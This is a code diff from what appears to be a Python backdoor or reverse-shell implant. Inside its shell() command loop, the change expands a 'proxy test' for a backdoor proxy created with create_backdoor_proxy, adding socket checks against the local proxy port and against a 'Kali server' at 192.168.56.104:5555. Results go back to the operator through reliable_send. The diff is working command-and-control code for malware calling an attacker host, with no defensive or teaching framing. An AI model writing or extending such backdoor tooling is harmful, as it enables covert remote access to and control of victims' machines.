@@ -304,22 +304,47 @@ def shell():
                 if proxy_manager is None:
                     proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
                 
-                # Test if proxy port is accessible
+                # Enhanced test with more details
                 if proxy_manager.channel and proxy_manager.channel.is_running:
                     import socket
                     test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    test_sock.settimeout(3)
+                    test_sock.settimeout(5)
                     try:
+                        # Test local connection
                         result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
-                        test_sock.close()
                         if result == 0:
-                            reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} responding locally")
+                            # Try to send test data
+                            test_sock.send(b"test\n")
+                            test_sock.settimeout(2)
+                            try:
+                                response = test_sock.recv(100)
+                                test_sock.close()
+                                reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} working - got response: {len(response)} bytes")
+                            except:
+                                test_sock.close()
+                                reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} accepting connections but no response")
                         else:
+                            test_sock.close()
                             reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} not responding (error: {result})")
                     except Exception as e:
+                        test_sock.close()
                         reliable_send(f"Proxy Test: Connection failed: {str(e)}")
                 else:
                     reliable_send("Proxy Test: Proxy not running")
+                    
+                # Also test target connectivity
+                try:
+                    target_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    target_test.settimeout(3)
+                    result = target_test.connect_ex(('192.168.56.104', 5555))
+                    target_test.close()
+                    if result == 0:
+                        reliable_send("Target Test: Can reach Kali server at 192.168.56.104:5555")
+                    else:
+                        reliable_send(f"Target Test: Cannot reach Kali server (error: {result})")
+                except Exception as e:
+                    reliable_send(f"Target Test: Error testing Kali connection: {str(e)}")
+                    
             except Exception as e:
                 reliable_send("Proxy test error: " + str(e))
 
